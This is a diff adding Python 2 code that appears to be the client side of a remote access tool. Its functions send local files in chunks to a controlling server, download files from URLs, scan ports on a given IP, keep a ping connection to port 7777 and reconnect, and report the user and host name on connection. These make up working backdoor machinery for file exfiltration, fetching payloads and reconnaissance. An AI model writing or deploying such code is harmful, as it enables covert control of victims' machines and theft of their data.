@@ -1,0 +1,130 @@
+def upload_to_server(filename):
+
+	with open(filename, 'rb') as local_file:
+
+		chunk = local_file.read(4096)
+
+		while chunk:
+
+			ROBOT.send(chunk)
+			sleep(0.1)
+			chunk = local_file.read(4096)
+
+		ROBOT.send("#DATA_HANDLER")
+
+	local_file.close()
+
+
+
+
+def download_from_server(filename):
+
+	with open(filename, "wb") as remote_file:
+
+		chunk = ROBOT.recv(4096)
+
+		while chunk:
+
+			remote_file.write(chunk)
+			sleep(0.1)
+			chunk = ROBOT.recv(4096)
+
+			if "#UPLOAD_END" in chunk: break
+
+	remote_file.close()
+
+
+
+
+
+
+def wget_from_url(url):
+
+	try:
+
+		filename = url.split('/')[-1]
+		content = urllib2.urlopen(url)
+
+		with open(filename, 'wb') as output:
+			output.write(content.read())
+		output.close()
+
+		ROBOT.send(pencode("[32m[+][0mDownloaded: %s.\n" % filename))
+
+	except Exception as e:
+		ROBOT.send(pencode("[91mERROR:[0m {}.\n".format(str(e))))
+
+
+
+
+def scan_local_network(ip):
+
+	try:
+		socket.inet_aton(ip)
+	except socket.error:
+		return '[31m[-][0m Invalid IP address.'
+
+	results = ''
+
+	for port in PORTS:
+
+		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		connection = sock.connect_ex((ip, port))
+		socket.setdefaulttimeout(0.5)
+		state = 'open' if not connection else 'closed'
+		results += '{:>5}/tcp {:>7}\n'.format(port, state)
+
+	return results.rstrip() + "#DATA_HANDLER"
+
+
+
+
+def _ping():
+
+	global RST_FLAG
+
+	ping_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	ping_sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
+	ping_sock.connect((IP, 7777))
+
+	while True:
+
+		try:
+			ping_sock.send("ping from client")
+			sleep(0.5)
+		except Exception as e:
+			break
+
+	if not RST_FLAG:
+		connect_to_server()
+		main()
+
+
+
+def connect_to_server():
+	"""try to connect server and send initial information
+	"""
+
+	global ROBOT
+	ROBOT = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	ROBOT.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
+
+	while True:
+
+		try:
+
+			ROBOT.connect((IP, PORT))
+			threading.Thread(target=_ping).start()
+
+			host = platform.node()
+			user = os.getenv("username")
+			client = "@".join([user, host])
+
+			ROBOT.sendall(pencode(client))
+
+		except Exception as e:
+
+			if e.errno == 10061:
+				continue # Connectin refused
+			elif e.errno == 10056:
+				break # Socket is already connected
